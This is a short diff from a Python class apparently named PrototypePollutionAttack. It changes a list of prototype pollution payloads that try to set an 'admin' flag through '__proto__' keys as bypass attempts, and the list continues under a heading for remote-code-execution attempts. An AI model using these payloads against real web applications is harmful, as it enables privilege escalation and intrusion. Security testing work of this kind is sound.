@@ -55,7 +55,7 @@ class PrototypePollutionAttack:
             
             # Bypass Attempts
             {"__pro__to__": {"admin": True}},
-            {"[\\"__proto__\\"]": {"admin": True}},
+            {"__proto__": {"admin": True}},
             {"__proto__.admin": True},
             
             # RCE Attempts via Pollution
